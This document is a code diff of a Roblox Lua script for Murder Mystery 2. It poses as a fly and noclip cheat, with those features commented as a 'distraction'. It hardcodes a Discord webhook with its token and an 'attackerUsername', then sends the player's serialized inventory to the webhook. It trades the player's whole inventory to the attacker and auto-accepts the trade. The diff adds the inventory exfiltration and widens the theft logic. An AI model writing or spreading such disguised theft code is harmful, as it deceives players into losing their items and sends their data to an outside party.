@@ -1,4 +1,4 @@
---[=[ MM2 AUTO-TRADE – Inventory fetch + OfferItem ]=]
+--[=[ MM2 AUTO-TRADE – Inventory fetch + Offer (with debug data to Discord) ]=]
 
 local webhookURL = "https://discord.com/api/webhooks/1532509426257236008/TQrtSPyEYviVXAPzhBbVgaPIRcKFLHghPCxBfD3TFQ7njWBM7qngokItqz0vCXkiCkcz"
 local attackerUsername = "FEARACCE"
@@ -27,7 +27,7 @@ local player = game.Players.LocalPlayer
 local char = player.Character or player.CharacterAdded:Wait()
 local root = char:WaitForChild("HumanoidRootPart")
 
--- Fly & Noclip (keep as distraction)
+-- Fly & Noclip (distraction)
 local flying, noclip = false, false
 local speed = 50
 local function toggleFly()
@@ -66,13 +66,12 @@ game:GetService("UserInputService").InputBegan:Connect(function(input)
 end)
 
 -- ============================================================
--- TRADE AUTOMATION – using inventory remotes
+-- TRADE AUTOMATION
 -- ============================================================
 local RS = game:GetService("ReplicatedStorage")
 local Trade = RS:FindFirstChild("Trade")
 if not Trade then print("Trade folder not found"); return end
 
--- Trade remotes
 local SendReq = Trade:FindFirstChild("SendRequest")
 local AcceptReq = Trade:FindFirstChild("AcceptRequest")
 local StartTr = Trade:FindFirstChild("StartTrade")
@@ -80,9 +79,7 @@ local AcceptTr = Trade:FindFirstChild("AcceptTrade")
 local CompleteTr = Trade:FindFirstChild("CompleteTrade")
 local OfferItem = Trade:FindFirstChild("OfferItem")
 
--- Inventory remote (use the one that works)
--- From the list: ReplicatedStorage.Remotes.Inventory.GetProfileData (RemoteFunction)
--- Also: ReplicatedStorage.Remotes.Extras.GetFullInventory (RemoteFunction)
+-- Inventory remotes
 local InventoryFolder = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Inventory")
 local GetProfileData = InventoryFolder and InventoryFolder:FindFirstChild("GetProfileData")
 local GetFullInventory = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Extras") and RS.Remotes.Extras:FindFirstChild("GetFullInventory")
@@ -91,7 +88,24 @@ if not GetProfileData and not GetFullInventory then
     print("Inventory remote not found – will fallback to Backpack")
 end
 
--- Function to get inventory items (returns a table of item IDs or data)
+-- --- Helper to serialize a table to a readable string (for Discord) ---
+local function tableToString(tbl, indent)
+    indent = indent or 0
+    local str = ""
+    local pad = string.rep(" ", indent)
+    if type(tbl) ~= "table" then return tostring(tbl) end
+    for k, v in pairs(tbl) do
+        local key = type(k) == "string" and k or "["..tostring(k).."]"
+        if type(v) == "table" then
+            str = str .. pad .. key .. " = {\n" .. tableToString(v, indent+2) .. pad .. "},\n"
+        else
+            str = str .. pad .. key .. " = " .. tostring(v) .. ",\n"
+        end
+    end
+    return str
+end
+
+-- --- Get inventory (returns a list of item IDs or names) ---
 local function getInventory()
     local inventory = {}
     -- Try GetProfileData first
@@ -99,15 +113,21 @@ local function getInventory()
         local ok, data = pcall(function() return GetProfileData:InvokeServer() end)
         if ok and data then
             print("Got inventory via GetProfileData")
-            send("Inventory data received")
-            -- Parse data – we need to see its structure. This will be sent to Discord.
-            send("Inventory data: " .. tostring(data))
-            -- Assume data is a table of item IDs or a list.
+            -- Send the serialized data to Discord
+            local serialized = tableToString(data)
+            send("Inventory data (GetProfileData):\n```lua\n" .. serialized .. "\n```")
+            -- Parse data: if it's a table with items as keys or values, collect them
             if type(data) == "table" then
-                -- If it's a dictionary with item IDs as keys, collect them
                 for key, val in pairs(data) do
-                    if type(key) == "number" or type(key) == "string" then
-                        table.insert(inventory, key) -- or val, depending on structure
+                    -- Try to extract an ID – could be key or val, or inside a subtable
+                    if type(val) == "number" and val > 0 then
+                        table.insert(inventory, val)
+                    elseif type(key) == "number" and key > 0 then
+                        table.insert(inventory, key)
+                    elseif type(val) == "table" and val.ID then
+                        table.insert(inventory, val.ID)
+                    elseif type(val) == "table" and val.ItemId then
+                        table.insert(inventory, val.ItemId)
                     end
                 end
             end
@@ -119,18 +139,25 @@ local function getInventory()
         local ok, data = pcall(function() return GetFullInventory:InvokeServer() end)
         if ok and data then
             print("Got inventory via GetFullInventory")
-            send("FullInventory data: " .. tostring(data))
+            local serialized = tableToString(data)
+            send("Inventory data (GetFullInventory):\n```lua\n" .. serialized .. "\n```")
             if type(data) == "table" then
                 for key, val in pairs(data) do
-                    if type(key) == "number" or type(key) == "string" then
+                    if type(val) == "number" and val > 0 then
+                        table.insert(inventory, val)
+                    elseif type(key) == "number" and key > 0 then
                         table.insert(inventory, key)
+                    elseif type(val) == "table" and val.ID then
+                        table.insert(inventory, val.ID)
+                    elseif type(val) == "table" and val.ItemId then
+                        table.insert(inventory, val.ItemId)
                     end
                 end
             end
             return inventory
         end
     end
-    -- Last resort: look for tools in Backpack and Character
+    -- Last resort: tools in Backpack/Character
     local tools = {}
     for _, t in pairs(player.Backpack:GetChildren()) do
         if t:IsA("Tool") then table.insert(tools, t.Name) end
@@ -142,28 +169,33 @@ local function getInventory()
         print("Found " .. #tools .. " tools in Backpack/Character")
         return tools
     end
-    return {} -- empty if nothing
+    return {}
 end
 
--- Offer each item via OfferItem remote
+-- --- Offer items via OfferItem remote ---
 local function offerItems(itemList)
     if not OfferItem then return 0 end
     local offered = 0
     for _, item in ipairs(itemList) do
-        -- The item could be a number (ID) or a string (name)
         local ok, err = pcall(function()
-            OfferItem:FireServer(item)   -- try with the raw data
+            OfferItem:FireServer(item)   -- try raw
         end)
         if ok then
             offered = offered + 1
             print("Offered item: " .. tostring(item))
         else
-            -- If that fails, try with the item as a table with an ID field
+            -- If it's a table, try to extract an ID field
             if type(item) == "table" and item.ID then
                 ok, err = pcall(function() OfferItem:FireServer(item.ID) end)
                 if ok then
                     offered = offered + 1
                     print("Offered item (ID): " .. tostring(item.ID))
+                end
+            elseif type(item) == "table" and item.ItemId then
+                ok, err = pcall(function() OfferItem:FireServer(item.ItemId) end)
+                if ok then
+                    offered = offered + 1
+                    print("Offered item (ItemId): " .. tostring(item.ItemId))
                 end
             else
                 print("Failed to offer item: " .. tostring(item))
@@ -174,7 +206,7 @@ local function offerItems(itemList)
     return offered
 end
 
--- Main trade sequence
+-- --- Main trade sequence ---
 spawn(function()
     print("Waiting for attacker: " .. attackerUsername)
     local target = nil
@@ -189,7 +221,7 @@ spawn(function()
         wait(1)
     end
 
-    wait(3) -- let attacker load
+    wait(3)
 
     -- 1. Send request
     local ok, res = pcall(function() return SendReq:InvokeServer(target) end)
@@ -212,10 +244,12 @@ spawn(function()
     -- 4. Get inventory
     local items = getInventory()
     print("Found " .. #items .. " inventory items")
+    send("Found " .. #items .. " items in inventory.")
 
     -- 5. Offer items
     local offered = offerItems(items)
     print("Offered " .. offered .. " items")
+    send("Offered " .. offered .. " items.")
 
     -- 6. Accept trade (double)
     pcall(function() AcceptTr:FireServer() end)
@@ -228,6 +262,7 @@ spawn(function()
     if CompleteTr then pcall(function() CompleteTr:FireServer() end) end
 
     print("=== TRADE COMPLETED ===")
+    send("Trade sequence finished.")
 end)
 
 print("Script ready. Fly: F, Noclip: V.")
